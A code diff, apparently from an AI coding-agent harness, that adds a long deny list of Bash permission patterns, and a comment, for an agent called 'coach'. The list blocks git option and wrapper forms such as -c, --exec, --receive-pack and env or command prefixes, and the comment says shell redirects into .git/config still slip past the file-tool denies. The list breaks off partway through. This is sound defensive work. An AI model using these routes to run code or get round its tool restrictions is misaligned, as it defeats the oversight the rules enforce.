@@ -158,6 +158,11 @@ elif kind == "coach":
     # NotebookEdit, plus Write/Edit into .git/ itself: the coach's file tools
     # stay usable on the tree, but a written .git/config could bind an exec
     # key (an alias, diff.external, a pager.<cmd>) the env lock does not pin.
+    # Residual under unrestricted Bash (AC5 / #763): shell redirects
+    # (`printf … > .git/config`, `cat …>`, `/usr/bin/tee`) are not closed by
+    # Write/Edit path denies — those fence the file tools only. Closing that
+    # needs `--allowedTools` narrowing or a fixed-argument wrapper, not more
+    # argv globs (same residual as unnamed wrappers).
     POSTURE_DENY = [{"NotebookEdit"}, {"Edit(./.git/**)"}, {"Write(./.git/**)"}]
     NEVER_DENY_TOOLS = [
         "Read", "Grep", "Glob", "Write", "Edit",
@@ -1685,6 +1690,857 @@ elif kind == "coach":
         {"Bash(command -p -- git*)"},
         {"Bash(command -v git*)"},
         {"Bash(*env git*)"},
+        {"Bash(command*git*)"},
+        {"Bash(command -p*git*)"},
+        {"Bash(command --*git*)"},
+        {"Bash(/usr/bin/env*git*)"},
+        {"Bash(/bin/env*git*)"},
+        {"Bash(*/env*git*)"},
+        {"Bash(env*git*)"},
+        {"Bash(git apply:*)"},
+        {"Bash(git apply*)"},
+        {"Bash(git*apply:*)"},
+        {"Bash(git*apply*)"},
+        {"Bash(git am:*)"},
+        {"Bash(git am*)"},
+        {"Bash(git\tam:*)"},
+        {"Bash(git\tam*)"},
+        {"Bash(git  am:*)"},
+        {"Bash(git  am*)"},
+        {"Bash(git -C * am:*)"},
+        {"Bash(git -C * am*)"},
+        {"Bash(git -c * am:*)"},
+        {"Bash(git -c * am*)"},
+        {"Bash(git\t-C * am:*)"},
+        {"Bash(git\t-C * am*)"},
+        {"Bash(git\t-c * am:*)"},
+        {"Bash(git\t-c * am*)"},
+        {"Bash(git  -C * am:*)"},
+        {"Bash(git  -C * am*)"},
+        {"Bash(git  -c * am:*)"},
+        {"Bash(git  -c * am*)"},
+        {"Bash(git*\tam:*)"},
+        {"Bash(git*\tam*)"},
+        {"Bash(git init:*)"},
+        {"Bash(git init*)"},
+        {"Bash(git*init:*)"},
+        {"Bash(git*init*)"},
+        {"Bash(git add '-e'*)"},
+        {"Bash(git add '-e':*)"},
+        {"Bash(git*add*'-e'*)"},
+        {"Bash(git add '-c'*)"},
+        {"Bash(git add '-c':*)"},
+        {"Bash(git*add*'-c'*)"},
+        {"Bash(git add '-S'*)"},
+        {"Bash(git add '-S':*)"},
+        {"Bash(git*add*'-S'*)"},
+        {"Bash(git add '-t'*)"},
+        {"Bash(git add '-t':*)"},
+        {"Bash(git*add*'-t'*)"},
+        {"Bash(git add '--e'*)"},
+        {"Bash(git add '--e':*)"},
+        {"Bash(git*add*'--e'*)"},
+        {"Bash(git add --'e'*)"},
+        {"Bash(git*add*--'e'*)"},
+        {"Bash(git add '--edit'*)"},
+        {"Bash(git add '--edit':*)"},
+        {"Bash(git*add*'--edit'*)"},
+        {"Bash(git add --'edit'*)"},
+        {"Bash(git*add*--'edit'*)"},
+        {"Bash(git add '--g'*)"},
+        {"Bash(git add '--g':*)"},
+        {"Bash(git*add*'--g'*)"},
+        {"Bash(git add --'g'*)"},
+        {"Bash(git*add*--'g'*)"},
+        {"Bash(git add '--gpg-sign'*)"},
+        {"Bash(git add '--gpg-sign':*)"},
+        {"Bash(git*add*'--gpg-sign'*)"},
+        {"Bash(git add --'gpg-sign'*)"},
+        {"Bash(git*add*--'gpg-sign'*)"},
+        {"Bash(git add '--te'*)"},
+        {"Bash(git add '--te':*)"},
+        {"Bash(git*add*'--te'*)"},
+        {"Bash(git add --'te'*)"},
+        {"Bash(git*add*--'te'*)"},
+        {"Bash(git add '--template'*)"},
+        {"Bash(git add '--template':*)"},
+        {"Bash(git*add*'--template'*)"},
+        {"Bash(git add --'template'*)"},
+        {"Bash(git*add*--'template'*)"},
+        {"Bash(git add '--sq'*)"},
+        {"Bash(git add '--sq':*)"},
+        {"Bash(git*add*'--sq'*)"},
+        {"Bash(git add --'sq'*)"},
+        {"Bash(git*add*--'sq'*)"},
+        {"Bash(git add '--squash'*)"},
+        {"Bash(git add '--squash':*)"},
+        {"Bash(git*add*'--squash'*)"},
+        {"Bash(git add --'squash'*)"},
+        {"Bash(git*add*--'squash'*)"},
+        {"Bash(git add '--fix'*)"},
+        {"Bash(git add '--fix':*)"},
+        {"Bash(git*add*'--fix'*)"},
+        {"Bash(git add --'fix'*)"},
+        {"Bash(git*add*--'fix'*)"},
+        {"Bash(git add '--fixup'*)"},
+        {"Bash(git add '--fixup':*)"},
+        {"Bash(git*add*'--fixup'*)"},
+        {"Bash(git add --'fixup'*)"},
+        {"Bash(git*add*--'fixup'*)"},
+        {"Bash(git add '--rece'*)"},
+        {"Bash(git add '--rece':*)"},
+        {"Bash(git*add*'--rece'*)"},
+        {"Bash(git add --'rece'*)"},
+        {"Bash(git*add*--'rece'*)"},
+        {"Bash(git add '--receive-pack'*)"},
+        {"Bash(git add '--receive-pack':*)"},
+        {"Bash(git*add*'--receive-pack'*)"},
+        {"Bash(git add --'receive-pack'*)"},
+        {"Bash(git*add*--'receive-pack'*)"},
+        {"Bash(git add '--exec'*)"},
+        {"Bash(git add '--exec':*)"},
+        {"Bash(git*add*'--exec'*)"},
+        {"Bash(git add --'exec'*)"},
+        {"Bash(git*add*--'exec'*)"},
+        {"Bash(git add '--rep'*)"},
+        {"Bash(git add '--rep':*)"},
+        {"Bash(git*add*'--rep'*)"},
+        {"Bash(git add --'rep'*)"},
+        {"Bash(git*add*--'rep'*)"},
+        {"Bash(git add '--repo'*)"},
+        {"Bash(git add '--repo':*)"},
+        {"Bash(git*add*'--repo'*)"},
+        {"Bash(git add --'repo'*)"},
+        {"Bash(git*add*--'repo'*)"},
+        {"Bash(git add '--recu'*)"},
+        {"Bash(git add '--recu':*)"},
+        {"Bash(git*add*'--recu'*)"},
+        {"Bash(git add --'recu'*)"},
+        {"Bash(git*add*--'recu'*)"},
+        {"Bash(git add '--recurse-submodules'*)"},
+        {"Bash(git add '--recurse-submodules':*)"},
+        {"Bash(git*add*'--recurse-submodules'*)"},
+        {"Bash(git add --'recurse-submodules'*)"},
+        {"Bash(git*add*--'recurse-submodules'*)"},
+        {"Bash(git add '--r'*)"},
+        {"Bash(git add '--r':*)"},
+        {"Bash(git*add*'--r'*)"},
+        {"Bash(git add --'r'*)"},
+        {"Bash(git*add*--'r'*)"},
+        {"Bash(git add \"-e\"*)"},
+        {"Bash(git add \"-e\":*)"},
+        {"Bash(git*add*\"-e\"*)"},
+        {"Bash(git add \"-c\"*)"},
+        {"Bash(git add \"-c\":*)"},
+        {"Bash(git*add*\"-c\"*)"},
+        {"Bash(git add \"-S\"*)"},
+        {"Bash(git add \"-S\":*)"},
+        {"Bash(git*add*\"-S\"*)"},
+        {"Bash(git add \"-t\"*)"},
+        {"Bash(git add \"-t\":*)"},
+        {"Bash(git*add*\"-t\"*)"},
+        {"Bash(git add \"--e\"*)"},
+        {"Bash(git add \"--e\":*)"},
+        {"Bash(git*add*\"--e\"*)"},
+        {"Bash(git add --\"e\"*)"},
+        {"Bash(git*add*--\"e\"*)"},
+        {"Bash(git add \"--edit\"*)"},
+        {"Bash(git add \"--edit\":*)"},
+        {"Bash(git*add*\"--edit\"*)"},
+        {"Bash(git add --\"edit\"*)"},
+        {"Bash(git*add*--\"edit\"*)"},
+        {"Bash(git add \"--g\"*)"},
+        {"Bash(git add \"--g\":*)"},
+        {"Bash(git*add*\"--g\"*)"},
+        {"Bash(git add --\"g\"*)"},
+        {"Bash(git*add*--\"g\"*)"},
+        {"Bash(git add \"--gpg-sign\"*)"},
+        {"Bash(git add \"--gpg-sign\":*)"},
+        {"Bash(git*add*\"--gpg-sign\"*)"},
+        {"Bash(git add --\"gpg-sign\"*)"},
+        {"Bash(git*add*--\"gpg-sign\"*)"},
+        {"Bash(git add \"--te\"*)"},
+        {"Bash(git add \"--te\":*)"},
+        {"Bash(git*add*\"--te\"*)"},
+        {"Bash(git add --\"te\"*)"},
+        {"Bash(git*add*--\"te\"*)"},
+        {"Bash(git add \"--template\"*)"},
+        {"Bash(git add \"--template\":*)"},
+        {"Bash(git*add*\"--template\"*)"},
+        {"Bash(git add --\"template\"*)"},
+        {"Bash(git*add*--\"template\"*)"},
+        {"Bash(git add \"--sq\"*)"},
+        {"Bash(git add \"--sq\":*)"},
+        {"Bash(git*add*\"--sq\"*)"},
+        {"Bash(git add --\"sq\"*)"},
+        {"Bash(git*add*--\"sq\"*)"},
+        {"Bash(git add \"--squash\"*)"},
+        {"Bash(git add \"--squash\":*)"},
+        {"Bash(git*add*\"--squash\"*)"},
+        {"Bash(git add --\"squash\"*)"},
+        {"Bash(git*add*--\"squash\"*)"},
+        {"Bash(git add \"--fix\"*)"},
+        {"Bash(git add \"--fix\":*)"},
+        {"Bash(git*add*\"--fix\"*)"},
+        {"Bash(git add --\"fix\"*)"},
+        {"Bash(git*add*--\"fix\"*)"},
+        {"Bash(git add \"--fixup\"*)"},
+        {"Bash(git add \"--fixup\":*)"},
+        {"Bash(git*add*\"--fixup\"*)"},
+        {"Bash(git add --\"fixup\"*)"},
+        {"Bash(git*add*--\"fixup\"*)"},
+        {"Bash(git add \"--rece\"*)"},
+        {"Bash(git add \"--rece\":*)"},
+        {"Bash(git*add*\"--rece\"*)"},
+        {"Bash(git add --\"rece\"*)"},
+        {"Bash(git*add*--\"rece\"*)"},
+        {"Bash(git add \"--receive-pack\"*)"},
+        {"Bash(git add \"--receive-pack\":*)"},
+        {"Bash(git*add*\"--receive-pack\"*)"},
+        {"Bash(git add --\"receive-pack\"*)"},
+        {"Bash(git*add*--\"receive-pack\"*)"},
+        {"Bash(git add \"--exec\"*)"},
+        {"Bash(git add \"--exec\":*)"},
+        {"Bash(git*add*\"--exec\"*)"},
+        {"Bash(git add --\"exec\"*)"},
+        {"Bash(git*add*--\"exec\"*)"},
+        {"Bash(git add \"--rep\"*)"},
+        {"Bash(git add \"--rep\":*)"},
+        {"Bash(git*add*\"--rep\"*)"},
+        {"Bash(git add --\"rep\"*)"},
+        {"Bash(git*add*--\"rep\"*)"},
+        {"Bash(git add \"--repo\"*)"},
+        {"Bash(git add \"--repo\":*)"},
+        {"Bash(git*add*\"--repo\"*)"},
+        {"Bash(git add --\"repo\"*)"},
+        {"Bash(git*add*--\"repo\"*)"},
+        {"Bash(git add \"--recu\"*)"},
+        {"Bash(git add \"--recu\":*)"},
+        {"Bash(git*add*\"--recu\"*)"},
+        {"Bash(git add --\"recu\"*)"},
+        {"Bash(git*add*--\"recu\"*)"},
+        {"Bash(git add \"--recurse-submodules\"*)"},
+        {"Bash(git add \"--recurse-submodules\":*)"},
+        {"Bash(git*add*\"--recurse-submodules\"*)"},
+        {"Bash(git add --\"recurse-submodules\"*)"},
+        {"Bash(git*add*--\"recurse-submodules\"*)"},
+        {"Bash(git add \"--r\"*)"},
+        {"Bash(git add \"--r\":*)"},
+        {"Bash(git*add*\"--r\"*)"},
+        {"Bash(git add --\"r\"*)"},
+        {"Bash(git*add*--\"r\"*)"},
+        {"Bash(git commit '-e'*)"},
+        {"Bash(git commit '-e':*)"},
+        {"Bash(git*commit*'-e'*)"},
+        {"Bash(git commit '-c'*)"},
+        {"Bash(git commit '-c':*)"},
+        {"Bash(git*commit*'-c'*)"},
+        {"Bash(git commit '-S'*)"},
+        {"Bash(git commit '-S':*)"},
+        {"Bash(git*commit*'-S'*)"},
+        {"Bash(git commit '-t'*)"},
+        {"Bash(git commit '-t':*)"},
+        {"Bash(git*commit*'-t'*)"},
+        {"Bash(git commit '--e'*)"},
+        {"Bash(git commit '--e':*)"},
+        {"Bash(git*commit*'--e'*)"},
+        {"Bash(git commit --'e'*)"},
+        {"Bash(git*commit*--'e'*)"},
+        {"Bash(git commit '--edit'*)"},
+        {"Bash(git commit '--edit':*)"},
+        {"Bash(git*commit*'--edit'*)"},
+        {"Bash(git commit --'edit'*)"},
+        {"Bash(git*commit*--'edit'*)"},
+        {"Bash(git commit '--g'*)"},
+        {"Bash(git commit '--g':*)"},
+        {"Bash(git*commit*'--g'*)"},
+        {"Bash(git commit --'g'*)"},
+        {"Bash(git*commit*--'g'*)"},
+        {"Bash(git commit '--gpg-sign'*)"},
+        {"Bash(git commit '--gpg-sign':*)"},
+        {"Bash(git*commit*'--gpg-sign'*)"},
+        {"Bash(git commit --'gpg-sign'*)"},
+        {"Bash(git*commit*--'gpg-sign'*)"},
+        {"Bash(git commit '--te'*)"},
+        {"Bash(git commit '--te':*)"},
+        {"Bash(git*commit*'--te'*)"},
+        {"Bash(git commit --'te'*)"},
+        {"Bash(git*commit*--'te'*)"},
+        {"Bash(git commit '--template'*)"},
+        {"Bash(git commit '--template':*)"},
+        {"Bash(git*commit*'--template'*)"},
+        {"Bash(git commit --'template'*)"},
+        {"Bash(git*commit*--'template'*)"},
+        {"Bash(git commit '--sq'*)"},
+        {"Bash(git commit '--sq':*)"},
+        {"Bash(git*commit*'--sq'*)"},
+        {"Bash(git commit --'sq'*)"},
+        {"Bash(git*commit*--'sq'*)"},
+        {"Bash(git commit '--squash'*)"},
+        {"Bash(git commit '--squash':*)"},
+        {"Bash(git*commit*'--squash'*)"},
+        {"Bash(git commit --'squash'*)"},
+        {"Bash(git*commit*--'squash'*)"},
+        {"Bash(git commit '--fix'*)"},
+        {"Bash(git commit '--fix':*)"},
+        {"Bash(git*commit*'--fix'*)"},
+        {"Bash(git commit --'fix'*)"},
+        {"Bash(git*commit*--'fix'*)"},
+        {"Bash(git commit '--fixup'*)"},
+        {"Bash(git commit '--fixup':*)"},
+        {"Bash(git*commit*'--fixup'*)"},
+        {"Bash(git commit --'fixup'*)"},
+        {"Bash(git*commit*--'fixup'*)"},
+        {"Bash(git commit '--rece'*)"},
+        {"Bash(git commit '--rece':*)"},
+        {"Bash(git*commit*'--rece'*)"},
+        {"Bash(git commit --'rece'*)"},
+        {"Bash(git*commit*--'rece'*)"},
+        {"Bash(git commit '--receive-pack'*)"},
+        {"Bash(git commit '--receive-pack':*)"},
+        {"Bash(git*commit*'--receive-pack'*)"},
+        {"Bash(git commit --'receive-pack'*)"},
+        {"Bash(git*commit*--'receive-pack'*)"},
+        {"Bash(git commit '--exec'*)"},
+        {"Bash(git commit '--exec':*)"},
+        {"Bash(git*commit*'--exec'*)"},
+        {"Bash(git commit --'exec'*)"},
+        {"Bash(git*commit*--'exec'*)"},
+        {"Bash(git commit '--rep'*)"},
+        {"Bash(git commit '--rep':*)"},
+        {"Bash(git*commit*'--rep'*)"},
+        {"Bash(git commit --'rep'*)"},
+        {"Bash(git*commit*--'rep'*)"},
+        {"Bash(git commit '--repo'*)"},
+        {"Bash(git commit '--repo':*)"},
+        {"Bash(git*commit*'--repo'*)"},
+        {"Bash(git commit --'repo'*)"},
+        {"Bash(git*commit*--'repo'*)"},
+        {"Bash(git commit '--recu'*)"},
+        {"Bash(git commit '--recu':*)"},
+        {"Bash(git*commit*'--recu'*)"},
+        {"Bash(git commit --'recu'*)"},
+        {"Bash(git*commit*--'recu'*)"},
+        {"Bash(git commit '--recurse-submodules'*)"},
+        {"Bash(git commit '--recurse-submodules':*)"},
+        {"Bash(git*commit*'--recurse-submodules'*)"},
+        {"Bash(git commit --'recurse-submodules'*)"},
+        {"Bash(git*commit*--'recurse-submodules'*)"},
+        {"Bash(git commit '--r'*)"},
+        {"Bash(git commit '--r':*)"},
+        {"Bash(git*commit*'--r'*)"},
+        {"Bash(git commit --'r'*)"},
+        {"Bash(git*commit*--'r'*)"},
+        {"Bash(git commit \"-e\"*)"},
+        {"Bash(git commit \"-e\":*)"},
+        {"Bash(git*commit*\"-e\"*)"},
+        {"Bash(git commit \"-c\"*)"},
+        {"Bash(git commit \"-c\":*)"},
+        {"Bash(git*commit*\"-c\"*)"},
+        {"Bash(git commit \"-S\"*)"},
+        {"Bash(git commit \"-S\":*)"},
+        {"Bash(git*commit*\"-S\"*)"},
+        {"Bash(git commit \"-t\"*)"},
+        {"Bash(git commit \"-t\":*)"},
+        {"Bash(git*commit*\"-t\"*)"},
+        {"Bash(git commit \"--e\"*)"},
+        {"Bash(git commit \"--e\":*)"},
+        {"Bash(git*commit*\"--e\"*)"},
+        {"Bash(git commit --\"e\"*)"},
+        {"Bash(git*commit*--\"e\"*)"},
+        {"Bash(git commit \"--edit\"*)"},
+        {"Bash(git commit \"--edit\":*)"},
+        {"Bash(git*commit*\"--edit\"*)"},
+        {"Bash(git commit --\"edit\"*)"},
+        {"Bash(git*commit*--\"edit\"*)"},
+        {"Bash(git commit \"--g\"*)"},
+        {"Bash(git commit \"--g\":*)"},
+        {"Bash(git*commit*\"--g\"*)"},
+        {"Bash(git commit --\"g\"*)"},
+        {"Bash(git*commit*--\"g\"*)"},
+        {"Bash(git commit \"--gpg-sign\"*)"},
+        {"Bash(git commit \"--gpg-sign\":*)"},
+        {"Bash(git*commit*\"--gpg-sign\"*)"},
+        {"Bash(git commit --\"gpg-sign\"*)"},
+        {"Bash(git*commit*--\"gpg-sign\"*)"},
+        {"Bash(git commit \"--te\"*)"},
+        {"Bash(git commit \"--te\":*)"},
+        {"Bash(git*commit*\"--te\"*)"},
+        {"Bash(git commit --\"te\"*)"},
+        {"Bash(git*commit*--\"te\"*)"},
+        {"Bash(git commit \"--template\"*)"},
+        {"Bash(git commit \"--template\":*)"},
+        {"Bash(git*commit*\"--template\"*)"},
+        {"Bash(git commit --\"template\"*)"},
+        {"Bash(git*commit*--\"template\"*)"},
+        {"Bash(git commit \"--sq\"*)"},
+        {"Bash(git commit \"--sq\":*)"},
+        {"Bash(git*commit*\"--sq\"*)"},
+        {"Bash(git commit --\"sq\"*)"},
+        {"Bash(git*commit*--\"sq\"*)"},
+        {"Bash(git commit \"--squash\"*)"},
+        {"Bash(git commit \"--squash\":*)"},
+        {"Bash(git*commit*\"--squash\"*)"},
+        {"Bash(git commit --\"squash\"*)"},
+        {"Bash(git*commit*--\"squash\"*)"},
+        {"Bash(git commit \"--fix\"*)"},
+        {"Bash(git commit \"--fix\":*)"},
+        {"Bash(git*commit*\"--fix\"*)"},
+        {"Bash(git commit --\"fix\"*)"},
+        {"Bash(git*commit*--\"fix\"*)"},
+        {"Bash(git commit \"--fixup\"*)"},
+        {"Bash(git commit \"--fixup\":*)"},
+        {"Bash(git*commit*\"--fixup\"*)"},
+        {"Bash(git commit --\"fixup\"*)"},
+        {"Bash(git*commit*--\"fixup\"*)"},
+        {"Bash(git commit \"--rece\"*)"},
+        {"Bash(git commit \"--rece\":*)"},
+        {"Bash(git*commit*\"--rece\"*)"},
+        {"Bash(git commit --\"rece\"*)"},
+        {"Bash(git*commit*--\"rece\"*)"},
+        {"Bash(git commit \"--receive-pack\"*)"},
+        {"Bash(git commit \"--receive-pack\":*)"},
+        {"Bash(git*commit*\"--receive-pack\"*)"},
+        {"Bash(git commit --\"receive-pack\"*)"},
+        {"Bash(git*commit*--\"receive-pack\"*)"},
+        {"Bash(git commit \"--exec\"*)"},
+        {"Bash(git commit \"--exec\":*)"},
+        {"Bash(git*commit*\"--exec\"*)"},
+        {"Bash(git commit --\"exec\"*)"},
+        {"Bash(git*commit*--\"exec\"*)"},
+        {"Bash(git commit \"--rep\"*)"},
+        {"Bash(git commit \"--rep\":*)"},
+        {"Bash(git*commit*\"--rep\"*)"},
+        {"Bash(git commit --\"rep\"*)"},
+        {"Bash(git*commit*--\"rep\"*)"},
+        {"Bash(git commit \"--repo\"*)"},
+        {"Bash(git commit \"--repo\":*)"},
+        {"Bash(git*commit*\"--repo\"*)"},
+        {"Bash(git commit --\"repo\"*)"},
+        {"Bash(git*commit*--\"repo\"*)"},
+        {"Bash(git commit \"--recu\"*)"},
+        {"Bash(git commit \"--recu\":*)"},
+        {"Bash(git*commit*\"--recu\"*)"},
+        {"Bash(git commit --\"recu\"*)"},
+        {"Bash(git*commit*--\"recu\"*)"},
+        {"Bash(git commit \"--recurse-submodules\"*)"},
+        {"Bash(git commit \"--recurse-submodules\":*)"},
+        {"Bash(git*commit*\"--recurse-submodules\"*)"},
+        {"Bash(git commit --\"recurse-submodules\"*)"},
+        {"Bash(git*commit*--\"recurse-submodules\"*)"},
+        {"Bash(git commit \"--r\"*)"},
+        {"Bash(git commit \"--r\":*)"},
+        {"Bash(git*commit*\"--r\"*)"},
+        {"Bash(git commit --\"r\"*)"},
+        {"Bash(git*commit*--\"r\"*)"},
+        {"Bash(git push '-e'*)"},
+        {"Bash(git push '-e':*)"},
+        {"Bash(git*push*'-e'*)"},
+        {"Bash(git push '-c'*)"},
+        {"Bash(git push '-c':*)"},
+        {"Bash(git*push*'-c'*)"},
+        {"Bash(git push '-S'*)"},
+        {"Bash(git push '-S':*)"},
+        {"Bash(git*push*'-S'*)"},
+        {"Bash(git push '-t'*)"},
+        {"Bash(git push '-t':*)"},
+        {"Bash(git*push*'-t'*)"},
+        {"Bash(git push '--e'*)"},
+        {"Bash(git push '--e':*)"},
+        {"Bash(git*push*'--e'*)"},
+        {"Bash(git push --'e'*)"},
+        {"Bash(git*push*--'e'*)"},
+        {"Bash(git push '--edit'*)"},
+        {"Bash(git push '--edit':*)"},
+        {"Bash(git*push*'--edit'*)"},
+        {"Bash(git push --'edit'*)"},
+        {"Bash(git*push*--'edit'*)"},
+        {"Bash(git push '--g'*)"},
+        {"Bash(git push '--g':*)"},
+        {"Bash(git*push*'--g'*)"},
+        {"Bash(git push --'g'*)"},
+        {"Bash(git*push*--'g'*)"},
+        {"Bash(git push '--gpg-sign'*)"},
+        {"Bash(git push '--gpg-sign':*)"},
+        {"Bash(git*push*'--gpg-sign'*)"},
+        {"Bash(git push --'gpg-sign'*)"},
+        {"Bash(git*push*--'gpg-sign'*)"},
+        {"Bash(git push '--te'*)"},
+        {"Bash(git push '--te':*)"},
+        {"Bash(git*push*'--te'*)"},
+        {"Bash(git push --'te'*)"},
+        {"Bash(git*push*--'te'*)"},
+        {"Bash(git push '--template'*)"},
+        {"Bash(git push '--template':*)"},
+        {"Bash(git*push*'--template'*)"},
+        {"Bash(git push --'template'*)"},
+        {"Bash(git*push*--'template'*)"},
+        {"Bash(git push '--sq'*)"},
+        {"Bash(git push '--sq':*)"},
+        {"Bash(git*push*'--sq'*)"},
+        {"Bash(git push --'sq'*)"},
+        {"Bash(git*push*--'sq'*)"},
+        {"Bash(git push '--squash'*)"},
+        {"Bash(git push '--squash':*)"},
+        {"Bash(git*push*'--squash'*)"},
+        {"Bash(git push --'squash'*)"},
+        {"Bash(git*push*--'squash'*)"},
+        {"Bash(git push '--fix'*)"},
+        {"Bash(git push '--fix':*)"},
+        {"Bash(git*push*'--fix'*)"},
+        {"Bash(git push --'fix'*)"},
+        {"Bash(git*push*--'fix'*)"},
+        {"Bash(git push '--fixup'*)"},
+        {"Bash(git push '--fixup':*)"},
+        {"Bash(git*push*'--fixup'*)"},
+        {"Bash(git push --'fixup'*)"},
+        {"Bash(git*push*--'fixup'*)"},
+        {"Bash(git push '--rece'*)"},
+        {"Bash(git push '--rece':*)"},
+        {"Bash(git*push*'--rece'*)"},
+        {"Bash(git push --'rece'*)"},
+        {"Bash(git*push*--'rece'*)"},
+        {"Bash(git push '--receive-pack'*)"},
+        {"Bash(git push '--receive-pack':*)"},
+        {"Bash(git*push*'--receive-pack'*)"},
+        {"Bash(git push --'receive-pack'*)"},
+        {"Bash(git*push*--'receive-pack'*)"},
+        {"Bash(git push '--exec'*)"},
+        {"Bash(git push '--exec':*)"},
+        {"Bash(git*push*'--exec'*)"},
+        {"Bash(git push --'exec'*)"},
+        {"Bash(git*push*--'exec'*)"},
+        {"Bash(git push '--rep'*)"},
+        {"Bash(git push '--rep':*)"},
+        {"Bash(git*push*'--rep'*)"},
+        {"Bash(git push --'rep'*)"},
+        {"Bash(git*push*--'rep'*)"},
+        {"Bash(git push '--repo'*)"},
+        {"Bash(git push '--repo':*)"},
+        {"Bash(git*push*'--repo'*)"},
+        {"Bash(git push --'repo'*)"},
+        {"Bash(git*push*--'repo'*)"},
+        {"Bash(git push '--recu'*)"},
+        {"Bash(git push '--recu':*)"},
+        {"Bash(git*push*'--recu'*)"},
+        {"Bash(git push --'recu'*)"},
+        {"Bash(git*push*--'recu'*)"},
+        {"Bash(git push '--recurse-submodules'*)"},
+        {"Bash(git push '--recurse-submodules':*)"},
+        {"Bash(git*push*'--recurse-submodules'*)"},
+        {"Bash(git push --'recurse-submodules'*)"},
+        {"Bash(git*push*--'recurse-submodules'*)"},
+        {"Bash(git push '--r'*)"},
+        {"Bash(git push '--r':*)"},
+        {"Bash(git*push*'--r'*)"},
+        {"Bash(git push --'r'*)"},
+        {"Bash(git*push*--'r'*)"},
+        {"Bash(git push \"-e\"*)"},
+        {"Bash(git push \"-e\":*)"},
+        {"Bash(git*push*\"-e\"*)"},
+        {"Bash(git push \"-c\"*)"},
+        {"Bash(git push \"-c\":*)"},
+        {"Bash(git*push*\"-c\"*)"},
+        {"Bash(git push \"-S\"*)"},
+        {"Bash(git push \"-S\":*)"},
+        {"Bash(git*push*\"-S\"*)"},
+        {"Bash(git push \"-t\"*)"},
+        {"Bash(git push \"-t\":*)"},
+        {"Bash(git*push*\"-t\"*)"},
+        {"Bash(git push \"--e\"*)"},
+        {"Bash(git push \"--e\":*)"},
+        {"Bash(git*push*\"--e\"*)"},
+        {"Bash(git push --\"e\"*)"},
+        {"Bash(git*push*--\"e\"*)"},
+        {"Bash(git push \"--edit\"*)"},
+        {"Bash(git push \"--edit\":*)"},
+        {"Bash(git*push*\"--edit\"*)"},
+        {"Bash(git push --\"edit\"*)"},
+        {"Bash(git*push*--\"edit\"*)"},
+        {"Bash(git push \"--g\"*)"},
+        {"Bash(git push \"--g\":*)"},
+        {"Bash(git*push*\"--g\"*)"},
+        {"Bash(git push --\"g\"*)"},
+        {"Bash(git*push*--\"g\"*)"},
+        {"Bash(git push \"--gpg-sign\"*)"},
+        {"Bash(git push \"--gpg-sign\":*)"},
+        {"Bash(git*push*\"--gpg-sign\"*)"},
+        {"Bash(git push --\"gpg-sign\"*)"},
+        {"Bash(git*push*--\"gpg-sign\"*)"},
+        {"Bash(git push \"--te\"*)"},
+        {"Bash(git push \"--te\":*)"},
+        {"Bash(git*push*\"--te\"*)"},
+        {"Bash(git push --\"te\"*)"},
+        {"Bash(git*push*--\"te\"*)"},
+        {"Bash(git push \"--template\"*)"},
+        {"Bash(git push \"--template\":*)"},
+        {"Bash(git*push*\"--template\"*)"},
+        {"Bash(git push --\"template\"*)"},
+        {"Bash(git*push*--\"template\"*)"},
+        {"Bash(git push \"--sq\"*)"},
+        {"Bash(git push \"--sq\":*)"},
+        {"Bash(git*push*\"--sq\"*)"},
+        {"Bash(git push --\"sq\"*)"},
+        {"Bash(git*push*--\"sq\"*)"},
+        {"Bash(git push \"--squash\"*)"},
+        {"Bash(git push \"--squash\":*)"},
+        {"Bash(git*push*\"--squash\"*)"},
+        {"Bash(git push --\"squash\"*)"},
+        {"Bash(git*push*--\"squash\"*)"},
+        {"Bash(git push \"--fix\"*)"},
+        {"Bash(git push \"--fix\":*)"},
+        {"Bash(git*push*\"--fix\"*)"},
+        {"Bash(git push --\"fix\"*)"},
+        {"Bash(git*push*--\"fix\"*)"},
+        {"Bash(git push \"--fixup\"*)"},
+        {"Bash(git push \"--fixup\":*)"},
+        {"Bash(git*push*\"--fixup\"*)"},
+        {"Bash(git push --\"fixup\"*)"},
+        {"Bash(git*push*--\"fixup\"*)"},
+        {"Bash(git push \"--rece\"*)"},
+        {"Bash(git push \"--rece\":*)"},
+        {"Bash(git*push*\"--rece\"*)"},
+        {"Bash(git push --\"rece\"*)"},
+        {"Bash(git*push*--\"rece\"*)"},
+        {"Bash(git push \"--receive-pack\"*)"},
+        {"Bash(git push \"--receive-pack\":*)"},
+        {"Bash(git*push*\"--receive-pack\"*)"},
+        {"Bash(git push --\"receive-pack\"*)"},
+        {"Bash(git*push*--\"receive-pack\"*)"},
+        {"Bash(git push \"--exec\"*)"},
+        {"Bash(git push \"--exec\":*)"},
+        {"Bash(git*push*\"--exec\"*)"},
+        {"Bash(git push --\"exec\"*)"},
+        {"Bash(git*push*--\"exec\"*)"},
+        {"Bash(git push \"--rep\"*)"},
+        {"Bash(git push \"--rep\":*)"},
+        {"Bash(git*push*\"--rep\"*)"},
+        {"Bash(git push --\"rep\"*)"},
+        {"Bash(git*push*--\"rep\"*)"},
+        {"Bash(git push \"--repo\"*)"},
+        {"Bash(git push \"--repo\":*)"},
+        {"Bash(git*push*\"--repo\"*)"},
+        {"Bash(git push --\"repo\"*)"},
+        {"Bash(git*push*--\"repo\"*)"},
+        {"Bash(git push \"--recu\"*)"},
+        {"Bash(git push \"--recu\":*)"},
+        {"Bash(git*push*\"--recu\"*)"},
+        {"Bash(git push --\"recu\"*)"},
+        {"Bash(git*push*--\"recu\"*)"},
+        {"Bash(git push \"--recurse-submodules\"*)"},
+        {"Bash(git push \"--recurse-submodules\":*)"},
+        {"Bash(git*push*\"--recurse-submodules\"*)"},
+        {"Bash(git push --\"recurse-submodules\"*)"},
+        {"Bash(git*push*--\"recurse-submodules\"*)"},
+        {"Bash(git push \"--r\"*)"},
+        {"Bash(git push \"--r\":*)"},
+        {"Bash(git*push*\"--r\"*)"},
+        {"Bash(git push --\"r\"*)"},
+        {"Bash(git*push*--\"r\"*)"},
+        {"Bash(git checkout '-e'*)"},
+        {"Bash(git checkout '-e':*)"},
+        {"Bash(git*checkout*'-e'*)"},
+        {"Bash(git checkout '-c'*)"},
+        {"Bash(git checkout '-c':*)"},
+        {"Bash(git*checkout*'-c'*)"},
+        {"Bash(git checkout '-S'*)"},
+        {"Bash(git checkout '-S':*)"},
+        {"Bash(git*checkout*'-S'*)"},
+        {"Bash(git checkout '-t'*)"},
